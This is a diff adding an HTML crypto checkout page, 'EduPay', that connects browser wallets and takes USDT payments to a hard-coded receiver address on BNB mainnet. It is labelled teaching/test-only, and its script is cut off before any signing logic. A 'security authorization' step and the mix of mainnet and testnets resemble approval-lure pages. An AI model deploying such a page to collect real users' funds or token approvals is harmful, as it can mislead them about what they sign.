@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="theme-color" content="#0f1115" />
+  <title>EduPay 收银台</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.0/dist/TronWeb.js"></script>
+  <script src="https://unpkg.com/lucide@0.468.0/dist/umd/lucide.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #090b10;
+      --surface: rgba(22, 25, 34, 0.88);
+      --surface-2: rgba(32, 36, 49, 0.86);
+      --surface-3: rgba(43, 49, 64, 0.9);
+      --surface-elevated: rgba(25, 29, 39, 0.96);
+      --border: rgba(115, 128, 155, 0.18);
+      --border-light: rgba(135, 153, 186, 0.34);
+      --text: #ffffff;
+      --text-2: #c2c9d6;
+      --text-3: #7f889b;
+      --primary: #4f7cff;
+      --primary-2: #6aa7ff;
+      --primary-soft: rgba(79, 124, 255, 0.14);
+      --accent: #36d6bd;
+      --accent-soft: rgba(54, 214, 189, 0.12);
+      --success: #32d583;
+      --warn: #f7b955;
+      --danger: #ff5f6d;
+      --radius: 16px;
+      --radius-sm: 12px;
+      --shadow: 0 26px 70px rgba(0, 0, 0, 0.52);
+      --shadow-soft: 0 18px 44px rgba(0, 0, 0, 0.32);
+      --ring: 0 0 0 1px rgba(106, 167, 255, 0.25), 0 0 0 5px rgba(79, 124, 255, 0.08);
+      --onboard-modal-z-index: 300;
+      --onboard-modal-backdrop: rgba(0, 0, 0, 0.72);
+      --onboard-modal-border-radius: 18px;
+      --onboard-connect-content-width: min(720px, calc(100vw - 32px));
+      --onboard-connect-content-height: min(680px, calc(100vh - 48px));
+      --onboard-wallet-columns: 2;
+      --onboard-wallet-button-border-radius: 12px;
+      --onboard-font-family-normal: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", "Inter", sans-serif;
+    }
+    html, body { min-height: 100%; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", "Inter", sans-serif;
+      background:
+        linear-gradient(rgba(255, 255, 255, 0.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.025) 1px, transparent 1px),
+        radial-gradient(circle at 50% -10%, rgba(79, 124, 255, 0.2) 0%, rgba(9, 11, 16, 0) 34%),
+        linear-gradient(180deg, #0f131d 0%, var(--bg) 44%, #07090d 100%);
+      background-size: 44px 44px, 44px 44px, auto, auto;
+      color: var(--text);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+      position: relative;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background:
+        linear-gradient(90deg, transparent 0%, rgba(106, 167, 255, 0.08) 50%, transparent 100%);
+      opacity: 0.55;
+      transform: translateX(-65%);
+      animation: ambientSweep 12s ease-in-out infinite;
+    }
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background: linear-gradient(180deg, rgba(255,255,255,0.04), transparent 18%, transparent 82%, rgba(0,0,0,0.2));
+    }
+    body.modal-open { overflow: hidden; }
+    button, input { font-family: inherit; }
+    button { cursor: pointer; border: none; background: none; color: inherit; }
+    input { outline: none; }
+    .icon-svg { width: 16px; height: 16px; stroke-width: 2.2; }
+
+    /* Top bar */
+    .topbar {
+      height: 72px;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 clamp(16px, 3vw, 34px);
+      border-bottom: 1px solid var(--border);
+      background: rgba(9, 11, 16, 0.74);
+      backdrop-filter: blur(20px);
+      position: sticky; top: 0; z-index: 50;
+      box-shadow: 0 1px 0 rgba(255,255,255,0.03), 0 16px 40px rgba(0,0,0,0.22);
+    }
+    .brand { display: flex; align-items: center; gap: 12px; font-size: 21px; font-weight: 760; letter-spacing: 0; }
+    .brand-icon {
+      width: 40px; height: 40px; border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 10px 26px rgba(79, 124, 255, 0.34);
+      position: relative;
+      overflow: hidden;
+    }
+    .brand-icon::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(115deg, transparent 22%, rgba(255,255,255,0.28) 45%, transparent 66%);
+      transform: translateX(-120%);
+      animation: sheen 5s ease-in-out infinite;
+    }
+    .brand-icon .icon-svg { width: 20px; height: 20px; color: white; z-index: 1; }
+
+    .connect-btn {
+      background: linear-gradient(135deg, var(--primary), var(--primary-2));
+      color: white; padding: 11px 18px; border-radius: 11px;
+      font-size: 14px; font-weight: 600;
+      box-shadow: 0 10px 24px rgba(79, 124, 255, 0.32);
+      transition: transform 0.18s, box-shadow 0.18s, filter 0.18s;
+      display: inline-flex; align-items: center; gap: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    .connect-btn::before,
+    .pay-btn::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(115deg, transparent 18%, rgba(255,255,255,0.2) 42%, transparent 64%);
+      transform: translateX(-120%);
+      transition: transform 0.6s ease;
+    }
+    .connect-btn:hover::before,
+    .pay-btn:hover::before { transform: translateX(120%); }
+    .connect-btn:hover { transform: translateY(-1px); box-shadow: 0 14px 34px rgba(79, 124, 255, 0.44); filter: saturate(1.08); }
+    .connect-btn:disabled { opacity: 0.75; cursor: wait; }
+    .connect-btn-sm { padding: 8px 14px; font-size: 13px; }
+    .btn-spinner {
+      width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white; border-radius: 50%;
+      animation: spin 0.7s linear infinite; display: inline-block;
+    }
+
+    .wallet-pill {
+      display: flex; align-items: center; gap: 8px;
+      background: var(--surface-2); border: 1px solid var(--border);
+      padding: 8px 9px 8px 12px; border-radius: 999px;
+      font-size: 13px; font-weight: 500; cursor: pointer;
+      transition: border-color 0.18s, background 0.18s, box-shadow 0.18s, transform 0.18s;
+      max-width: min(460px, calc(100vw - 180px));
+      overflow: hidden;
+      box-shadow: 0 10px 24px rgba(0,0,0,0.24);
+    }
+    .wallet-pill:hover { border-color: var(--primary-2); background: rgba(43, 49, 64, 0.96); transform: translateY(-1px); box-shadow: var(--ring); }
+    .wallet-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--success); box-shadow: 0 0 0 4px rgba(50, 213, 131, 0.08), 0 0 12px var(--success); }
+    .wallet-addr { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+
+    /* Layout */
+    .page { display: flex; justify-content: center; align-items: flex-start; min-height: calc(100vh - 72px); padding: clamp(28px, 5vw, 56px) 16px; position: relative; z-index: 1; }
+    .checkout {
+      width: 100%; max-width: 1060px;
+      display: grid; grid-template-columns: minmax(0, 1fr) 370px; gap: 28px;
+      align-items: start;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-soft);
+      overflow: hidden;
+      backdrop-filter: blur(18px);
+      position: relative;
+      animation: cardEnter 0.5s cubic-bezier(0.16, 1, 0.3, 1) both;
+    }
+    .card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background: linear-gradient(180deg, rgba(255,255,255,0.055), transparent 32%);
+      opacity: 0.72;
+    }
+    .card-body { padding: 32px; position: relative; z-index: 1; }
+    .card-title {
+      font-size: 20px; font-weight: 760;
+      margin-bottom: 22px;
+      display: flex; align-items: center; gap: 12px;
+      letter-spacing: 0;
+    }
+    .card-title-icon {
+      width: 34px; height: 34px; border-radius: 10px;
+      background: linear-gradient(135deg, var(--primary-soft), var(--accent-soft));
+      color: var(--primary-2);
+      display: flex; align-items: center; justify-content: center;
+      border: 1px solid rgba(106, 167, 255, 0.18);
+    }
+
+    /* Order summary (right) */
+    .summary { position: sticky; top: 96px; height: fit-content; animation-delay: 0.08s; }
+    .summary-header {
+      background:
+        linear-gradient(135deg, rgba(79, 124, 255, 0.96), rgba(54, 214, 189, 0.88)),
+        linear-gradient(rgba(255,255,255,0.15) 1px, transparent 1px);
+      background-size: auto, 24px 24px;
+      padding: 28px 30px 30px;
+      color: white;
+      position: relative;
+      overflow: hidden;
+    }
+    .summary-header::after {
+      content: "";
+      position: absolute;
+      left: 0; right: 0; bottom: 0;
+      height: 1px;
+      background: rgba(255,255,255,0.28);
+    }
+    .summary-label { font-size: 13px; opacity: 0.88; margin-bottom: 8px; font-weight: 650; }
+    .summary-amount { font-size: 42px; font-weight: 780; letter-spacing: 0; font-variant-numeric: tabular-nums; }
+    .summary-currency { font-size: 16px; font-weight: 500; opacity: 0.9; margin-left: 4px; }
+    .summary-body { padding: 28px 30px; position: relative; z-index: 1; }
+    .summary-row {
+      display: flex; justify-content: space-between; align-items: center;
+      font-size: 14px; color: var(--text-2);
+      padding: 14px 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .summary-row:last-child { border-bottom: none; }
+    .summary-row .k { color: var(--text-3); }
+    .summary-row .v { font-weight: 500; color: var(--text); }
+
+    /* Merchant */
+    .merchant {
+      display: flex; align-items: center; gap: 14px;
+      padding: 17px; border-radius: var(--radius-sm);
+      background: linear-gradient(180deg, rgba(43,49,64,0.88), rgba(31,35,47,0.86));
+      border: 1px solid var(--border);
+      margin-bottom: 22px;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.04);
+    }
+    .merchant-logo {
+      width: 52px; height: 52px; border-radius: 14px;
+      background: linear-gradient(135deg, rgba(79,124,255,0.92), rgba(54,214,189,0.84));
+      display: flex; align-items: center; justify-content: center;
+      color: white;
+      box-shadow: 0 12px 24px rgba(54,214,189,0.12);
+    }
+    .merchant-logo .icon-svg { width: 24px; height: 24px; }
+    .merchant-info { flex: 1; }
+    .merchant-name { font-weight: 720; font-size: 16px; }
+    .merchant-desc { color: var(--text-3); font-size: 12px; margin-top: 4px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+
+    /* Network selector */
+    .section-label { font-size: 12px; color: var(--text-3); margin: 22px 0 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+    .merchant + .section-label { margin-top: 0; }
+    .net-tabs {
+      display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; margin-bottom: 22px;
+    }
+    .net-tab {
+      min-height: 78px;
+      padding: 16px 14px; border-radius: var(--radius-sm);
+      background: rgba(32, 36, 49, 0.72); border: 1px solid transparent;
+      color: var(--text-2); text-align: center; cursor: pointer;
+      transition: border-color 0.18s, color 0.18s, background 0.18s, transform 0.18s, box-shadow 0.18s;
+      position: relative; overflow: hidden;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+    }
+    .net-tab::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(79,124,255,0.18), rgba(54,214,189,0.1));
+      opacity: 0;
+      transition: opacity 0.18s;
+    }
+    .net-tab:hover { border-color: var(--border-light); color: var(--text); transform: translateY(-1px); }
+    .net-tab:hover::before { opacity: 0.55; }
+    .net-tab.active { background: rgba(79,124,255,0.14); border-color: rgba(106,167,255,0.68); color: var(--primary-2); box-shadow: var(--ring); }
+    .net-tab.active::after {
+      content: "";
+      position: absolute;
+      left: 18px; right: 18px; bottom: 0;
+      height: 2px;
+      background: linear-gradient(90deg, var(--primary-2), var(--accent));
+      border-radius: 999px 999px 0 0;
+    }
+    .net-tab.disabled { opacity: 0.55; cursor: not-allowed; }
+    .net-tab.disabled:hover { border-color: transparent; color: var(--text-2); transform: none; }
+    .net-tab .name { font-weight: 720; font-size: 14px; position: relative; z-index: 1; }
+    .net-tab .tag { font-size: 11px; margin-top: 4px; opacity: 0.85; }
+    .net-tab .soon-badge {
+      position: absolute; top: 6px; right: 6px;
+      font-size: 9px; font-weight: 700; color: var(--warn);
+      background: rgba(240, 185, 11, 0.12); padding: 2px 5px; border-radius: 4px;
+    }
+
+    /* Amount */
+    .amount-wrap {
+      background: linear-gradient(180deg, rgba(32,36,49,0.88), rgba(26,30,40,0.92));
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 20px 20px 22px;
+      margin-bottom: 22px;
+      transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+    }
+    .amount-wrap:focus-within { border-color: rgba(106,167,255,0.62); box-shadow: var(--ring); }
+    .amount-label-row {
+      display: flex; justify-content: space-between; gap: 12px;
+      font-size: 12px; color: var(--text-3); margin-bottom: 10px;
+    }
+    .amount-input-row { display: flex; align-items: center; gap: 12px; }
+    .amount-input {
+      flex: 1; background: transparent; border: none;
+      color: var(--text); font-size: 42px; font-weight: 780;
+      font-variant-numeric: tabular-nums;
+      min-width: 0;
+      letter-spacing: 0;
+    }
+    .amount-input::placeholder { color: var(--text-3); }
+    .token-badge {
+      display: flex; align-items: center; gap: 8px;
+      background: rgba(43,49,64,0.96); border: 1px solid var(--border-light);
+      padding: 8px 13px; border-radius: 999px;
+      font-weight: 600; font-size: 14px;
+      flex: 0 0 auto;
+    }
+    .token-badge .icon {
+      width: 22px; height: 22px; border-radius: 50%;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; color: white; font-weight: 700;
+    }
+    .quick-amounts { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; margin-top: 18px; }
+    .quick-amount {
+      min-height: 48px; padding: 10px; border-radius: 10px;
+      background: rgba(43,49,64,0.9); color: var(--text-2);
+      font-size: 13px; font-weight: 600;
+      border: 1px solid transparent; transition: border-color 0.18s, background 0.18s, color 0.18s, transform 0.18s;
+    }
+    .quick-amount:hover { background: var(--primary-soft); color: var(--primary-2); transform: translateY(-1px); }
+    .quick-amount.active { background: var(--primary-soft); color: var(--primary-2); border-color: rgba(106,167,255,0.68); box-shadow: inset 0 1px 0 rgba(255,255,255,0.05); }
+
+    /* Payment method */
+    .pay-method {
+      display: flex; align-items: center; gap: 14px;
+      padding: 16px; border-radius: var(--radius-sm);
+      background: rgba(32,36,49,0.84); border: 1px solid var(--border);
+      margin-bottom: 24px;
+    }
+    .pay-method-icon { width: 42px; height: 42px; border-radius: 12px; background: linear-gradient(135deg, rgba(79,124,255,0.18), rgba(54,214,189,0.1)); display: flex; align-items: center; justify-content: center; color: var(--primary-2); border: 1px solid rgba(106,167,255,0.16); }
+    .pay-method-icon .icon-svg { width: 21px; height: 21px; }
+    .pay-method-info { flex: 1; }
+    .pay-method-name { font-weight: 720; font-size: 15px; }
+    .pay-method-desc { color: var(--text-3); font-size: 12px; margin-top: 2px; }
+    .pay-method-check { width: 24px; height: 24px; border-radius: 50%; border: 2px solid rgba(79,124,255,0.35); background: linear-gradient(135deg, var(--primary), var(--primary-2)); display: flex; align-items: center; justify-content: center; color: white; font-size: 12px; box-shadow: 0 8px 18px rgba(79,124,255,0.28); }
+
+    /* Pay button */
+    .pay-btn {
+      width: 100%;
+      min-height: 64px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-2));
+      color: white; padding: 18px; border-radius: 14px;
+      font-size: 17px; font-weight: 780;
+      box-shadow: 0 16px 34px rgba(79, 124, 255, 0.32);
+      transition: transform 0.18s, box-shadow 0.18s, filter 0.18s;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      position: relative;
+      overflow: hidden;
+      letter-spacing: 0;
+    }
+    .pay-btn:hover { transform: translateY(-2px); box-shadow: 0 22px 44px rgba(79, 124, 255, 0.42); filter: saturate(1.08); }
+    .pay-btn:active { transform: translateY(0); }
+    .pay-btn:disabled { background: var(--surface-2); color: var(--text-3); box-shadow: none; cursor: not-allowed; transform: none; }
+
+    /* Secure footer */
+    .secure-line {
+      display: flex; align-items: center; justify-content: center;
+      gap: 8px; color: var(--text-3); font-size: 12px; margin-top: 16px;
+    }
+    .secure-line .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--success); box-shadow: 0 0 12px rgba(50,213,131,0.8); }
+
+    /* Modals */
+    .modal-mask {
+      position: fixed; inset: 0;
+      background: rgba(0, 0, 0, 0.65);
+      display: none; align-items: center; justify-content: center;
+      z-index: 100;
+      backdrop-filter: blur(10px);
+      animation: fadeIn 0.2s ease;
+    }
+    .modal-mask.show { display: flex; }
+    .modal {
+      background: var(--surface-elevated);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      width: 92%; max-width: 420px;
+      max-height: 90vh; overflow-y: auto;
+      padding: 26px;
+      box-shadow: var(--shadow);
+      animation: pop 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+      backdrop-filter: blur(18px);
+    }
+    .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+    .modal-close {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: var(--surface-2); color: var(--text-2);
+      font-size: 20px; display: flex; align-items: center; justify-content: center;
+      transition: 0.15s;
+    }
+    .modal-close:hover { background: var(--surface-3); color: var(--text); }
+    .modal-title { font-size: 18px; font-weight: 700; }
+    .modal-desc { color: var(--text-2); font-size: 13px; line-height: 1.6; margin-bottom: 18px; }
+    .modal-btns { display: flex; gap: 10px; margin-top: 18px; }
+    .modal-btns button { flex: 1; padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; transition: 0.15s; }
+    .btn-cancel { background: var(--surface-2); color: var(--text-2); }
+    .btn-cancel:hover { background: var(--surface-3); }
+    .btn-confirm { background: linear-gradient(135deg, var(--primary), var(--primary-2)); color: white; box-shadow: 0 10px 24px rgba(79,124,255,0.24); }
+
+    /* Wallet option */
+    .wallet-option {
+      display: flex; align-items: center; gap: 12px;
+      padding: 14px; border-radius: 12px;
+      background: var(--surface-2);
+      margin-bottom: 8px; cursor: pointer;
+      transition: 0.15s;
+    }
+    .wallet-option:hover { background: var(--surface-3); }
+    .wallet-option-icon { width: 38px; height: 38px; border-radius: 50%; background: var(--surface); display: flex; align-items: center; justify-content: center; font-size: 20px; }
+    .wallet-option-body { flex: 1; min-width: 0; }
+    .wallet-option-name { font-weight: 600; font-size: 15px; }
+    .wallet-option-status { margin-top: 3px; color: var(--text-3); font-size: 12px; }
+    .wallet-option-chevron { color: var(--text-3); font-size: 22px; }
+    .wallet-pill-icon { font-size: 14px; line-height: 1; }
+    .wallet-pill-logo,
+    .wallet-pill-logo img,
+    .wallet-pill-logo svg {
+      width: 16px; height: 16px; display: block; flex: 0 0 16px; border-radius: 4px;
+    }
+    .wallet-pill-name { max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--text-2); }
+
+    /* Verification overlay */
+    .verify-box { text-align: center; padding: 10px; }
+    .shield-ring {
+      width: 90px; height: 90px;
+      margin: 0 auto 24px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(54,214,189,0.16), rgba(79,124,255,0.12));
+      display: flex; align-items: center; justify-content: center;
+      position: relative;
+      color: var(--primary-2);
+    }
+    .shield-ring::before {
+      content: ''; position: absolute; inset: -6px;
+      border-radius: 50%;
+      border: 2px solid transparent;
+      border-top-color: var(--primary-2);
+      border-right-color: var(--accent);
+      animation: spin 1.2s linear infinite;
+    }
+    .shield-icon .icon-svg { width: 40px; height: 40px; }
+    .verify-title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+    .verify-desc { color: var(--text-2); font-size: 14px; line-height: 1.6; margin-bottom: 28px; }
+    .verify-progress { height: 5px; background: var(--surface-2); border-radius: 999px; overflow: hidden; margin-bottom: 22px; }
+    .verify-progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--primary), var(--accent)); border-radius: 999px; transition: width 0.4s ease; box-shadow: 0 0 18px rgba(54,214,189,0.42); }
+    .verify-steps { text-align: left; }
+    .verify-step {
+      display: flex; align-items: center; gap: 12px;
+      padding: 8px 0; font-size: 14px; color: var(--text-2);
+    }
+    .verify-step.active { color: var(--text); }
+    .verify-step.done { color: var(--success); }
+    .verify-step-icon {
+      width: 22px; height: 22px; border-radius: 50%;
+      background: var(--surface-2); color: var(--text-3);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 700; flex-shrink: 0;
+    }
+    .verify-step.active .verify-step-icon { background: var(--primary); color: white; box-shadow: 0 0 0 5px rgba(79,124,255,0.12); }
+    .verify-step.done .verify-step-icon { background: var(--success); color: white; }
+
+    /* Toast */
+    .toast-container {
+      position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+      z-index: 200; display: flex; flex-direction: column; gap: 8px; align-items: center;
+    }
+    .toast {
+      background: var(--surface-elevated); border: 1px solid var(--border);
+      padding: 12px 20px; border-radius: 12px; font-size: 14px;
+      display: flex; align-items: center; gap: 10px;
+      box-shadow: var(--shadow); animation: pop 0.2s ease;
+      min-width: 260px; max-width: 380px;
+      backdrop-filter: blur(14px);
+    }
+    .toast.success { border-color: var(--success); }
+    .toast.error { border-color: var(--danger); }
+    .toast.warn { border-color: var(--warn); }
+    .toast .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+    .toast.success .dot { background: var(--success); }
+    .toast.error .dot { background: var(--danger); }
+    .toast.warn .dot { background: var(--warn); }
+    .toast .text { flex: 1; }
+
+    .page-footer {
+      text-align: center; padding: 24px 16px 34px;
+      color: var(--text-3); font-size: 12px;
+      position: relative; z-index: 1;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes sheen { 0%, 45% { transform: translateX(-120%); } 70%, 100% { transform: translateX(120%); } }
+    @keyframes ambientSweep {
+      0%, 100% { transform: translateX(-70%); opacity: 0.25; }
+      50% { transform: translateX(70%); opacity: 0.48; }
+    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes pop { from { transform: scale(0.96) translateY(12px); opacity: 0; } to { transform: scale(1) translateY(0); opacity: 1; } }
+    @keyframes cardEnter { from { transform: translateY(18px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+    @media (max-width: 900px) {
+      .checkout { grid-template-columns: 1fr; max-width: 680px; }
+      .summary { position: relative; top: 0; }
+    }
+    @media (max-width: 540px) {
+      .topbar { padding: 0 14px; height: 64px; }
+      .brand { font-size: 18px; }
+      .brand-icon { width: 36px; height: 36px; }
+      .page { padding: 18px 12px; min-height: calc(100vh - 64px); }
+      .card-body { padding: 20px; }
+      .amount-input { font-size: 34px; }
+      .amount-label-row { flex-direction: column; }
+      .net-tabs { gap: 8px; }
+      .net-tab { min-height: 72px; padding: 12px 10px; }
+      .quick-amounts { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .summary-header, .summary-body { padding-left: 22px; padding-right: 22px; }
+      .summary-amount { font-size: 36px; }
+      .wallet-pill-name { display: none; }
+      .wallet-pill { max-width: calc(100vw - 144px); }
+    }
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-icon"><i class="icon-svg" data-lucide="lock-keyhole"></i></div>
+      <span>EduPay</span>
+    </div>
+    <div id="walletArea">
+      <button class="connect-btn connect-btn-sm" id="connectBtn">连接钱包</button>
+    </div>
+  </div>
+
+  <div class="page">
+    <div class="checkout">
+      <!-- Left: payment form -->
+      <div class="card">
+        <div class="card-body">
+          <div class="card-title">
+            <div class="card-title-icon"><i class="icon-svg" data-lucide="credit-card"></i></div>
+            <span>确认付款信息</span>
+          </div>
+
+          <div class="merchant">
+            <div class="merchant-logo"><i class="icon-svg" data-lucide="store"></i></div>
+            <div class="merchant-info">
+              <div class="merchant-name">EduPay 官方商户</div>
+              <div class="merchant-desc" id="merchantAddr">0x...</div>
+            </div>
+          </div>
+
+          <div class="section-label">选择网络</div>
+          <div class="net-tabs">
+            <div class="net-tab active" data-chain="56">
+              <div class="name">BNB Smart Chain</div>
+              <div class="tag">Mainnet</div>
+            </div>
+            <div class="net-tab" data-chain="11155111">
+              <div class="name">Ethereum</div>
+              <div class="tag">Sepolia</div>
+            </div>
+            <div class="net-tab disabled" data-chain="solana">
+              <span class="soon-badge">即将上线</span>
+              <div class="name">Solana</div>
+              <div class="tag">Devnet</div>
+            </div>
+            <div class="net-tab" data-chain="tron">
+              <div class="name">TRON</div>
+              <div class="tag">Nile</div>
+            </div>
+          </div>
+
+          <div class="section-label">支付金额</div>
+          <div class="amount-wrap">
+            <div class="amount-label-row">
+              <span>请输入金额</span>
+              <span>钱包余额: <b id="userBal">0.0000</b> USDT</span>
+            </div>
+            <div class="amount-input-row">
+              <input type="text" class="amount-input" id="payAmount" placeholder="0.00" inputmode="decimal" />
+              <div class="token-badge">
+                <div class="icon">U</div>
+                <span>USDT</span>
+              </div>
+            </div>
+            <div class="quick-amounts">
+              <button class="quick-amount" data-v="10">10</button>
+              <button class="quick-amount" data-v="50">50</button>
+              <button class="quick-amount" data-v="100">100</button>
+              <button class="quick-amount" data-v="500">500</button>
+            </div>
+          </div>
+
+          <div class="section-label">支付方式</div>
+          <div class="pay-method">
+            <div class="pay-method-icon"><i class="icon-svg" data-lucide="wallet-cards"></i></div>
+            <div class="pay-method-info">
+              <div class="pay-method-name">浏览器钱包</div>
+              <div class="pay-method-desc">使用已连接钱包安全支付</div>
+            </div>
+            <div class="pay-method-check">✓</div>
+          </div>
+
+          <button class="pay-btn" id="payBtn" disabled>连接钱包以支付</button>
+          <div class="secure-line">
+            <span class="dot"></span>
+            <span>EIP-712 签名验证 · 加密传输 · 即时到账</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right: order summary -->
+      <div class="card summary">
+        <div class="summary-header">
+          <div class="summary-label">购买总额</div>
+          <div>
+            <span class="summary-amount" id="summaryAmount">0.00</span>
+            <span class="summary-currency">USDT</span>
+          </div>
+        </div>
+        <div class="summary-body">
+          <div class="summary-row">
+            <span class="k">订单编号</span>
+            <span class="v">EP-20260707-001</span>
+          </div>
+          <div class="summary-row">
+            <span class="k">商品名称</span>
+            <span class="v">EduPay 教育服务</span>
+          </div>
+          <div class="summary-row">
+            <span class="k">支付代币</span>
+            <span class="v">Tether USD (USDT)</span>
+          </div>
+          <div class="summary-row">
+            <span class="k">网络手续费</span>
+            <span class="v" id="networkFee">≈ 0.0005 BNB</span>
+          </div>
+          <div class="summary-row">
+            <span class="k">预计到账</span>
+            <span class="v" id="summaryNet">0.00 USDT</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="page-footer">
+    <div>EduPay · 教育代币安全支付解决方案</div>
+    <div style="margin-top:6px;">© 2026 · 仅用于教学测试</div>
+  </div>
+
+  <!-- Wallet select modal -->
+  <div class="modal-mask" id="walletSelectModal" onclick="if(event.target===this) closeWalletSelect()">
+    <div class="modal">
+      <div class="modal-header">
+        <div class="modal-title">连接钱包</div>
+        <button class="modal-close" onclick="closeWalletSelect()">×</button>
+      </div>
+      <div class="modal-desc">选择钱包以连接 BNB Smart Chain Mainnet</div>
+      <div id="walletOptions"></div>
+      <div class="modal-desc" style="margin-bottom:0; font-size:12px; color:var(--text-3);">
+        未安装？ <a href="https://metamask.io/download/" target="_blank" style="color:var(--primary-2)">下载 MetaMask</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Chain modal -->
+  <div class="modal-mask" id="chainModal" onclick="if(event.target===this) closeChainModal()">
+    <div class="modal">
+      <div class="modal-header">
+        <div class="modal-title">网络错误</div>
+        <button class="modal-close" onclick="closeChainModal()">×</button>
+      </div>
+      <div class="modal-desc">当前钱包网络与所选网络不一致，请切换后继续。</div>
+      <div class="modal-btns">
+        <button class="btn-cancel" onclick="closeChainModal()">稍后</button>
+        <button class="btn-confirm" onclick="switchChain()">切换网络</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- No wallet modal -->
+  <div class="modal-mask" id="noWalletModal" onclick="if(event.target===this) closeNoWallet()">
+    <div class="modal">
+      <div class="modal-header">
+        <div class="modal-title">未检测到钱包</div>
+        <button class="modal-close" onclick="closeNoWallet()">×</button>
+      </div>
+      <div class="modal-desc">浏览器未检测到 Web3 钱包。若已安装 MetaMask，请确认扩展已启用并解锁。</div>
+      <div class="modal-btns">
+        <button class="btn-cancel" onclick="closeNoWallet()">关闭</button>
+        <button class="btn-confirm" onclick="window.open('https://metamask.io/download/', '_blank')">下载 MetaMask</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Verification overlay -->
+  <div class="modal-mask" id="verifyMask" onclick="return false">
+    <div class="modal" style="max-width: 380px;">
+      <div class="verify-box">
+        <div class="shield-ring"><div class="shield-icon"><i class="icon-svg" data-lucide="shield-check"></i></div></div>
+        <div class="verify-title">正在处理支付</div>
+        <div class="verify-desc">请在弹出的钱包窗口中<strong>确认交易</strong>，完成安全授权与付款。</div>
+        <div class="verify-progress"><div class="verify-progress-bar" id="verifyProgress"></div></div>
+        <div class="verify-steps">
+          <div class="verify-step" id="vstep1"><div class="verify-step-icon">1</div><span>验证订单信息</span></div>
+          <div class="verify-step" id="vstep2"><div class="verify-step-icon">2</div><span>安全授权确认</span></div>
+          <div class="verify-step" id="vstep3"><div class="verify-step-icon">3</div><span>提交支付交易</span></div>
+          <div class="verify-step" id="vstep4"><div class="verify-step-icon">4</div><span>完成到账</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast-container" id="toastContainer"></div>
+
+  <script>
+    const CONFIG = {
+      receiver: '0x9B0c7994F4289Aa247d06A96C4447EB36c13CfBb',
+      chains: {
+        56: {
+          name: 'BNB Smart Chain Mainnet',
+          hex: '0x38',
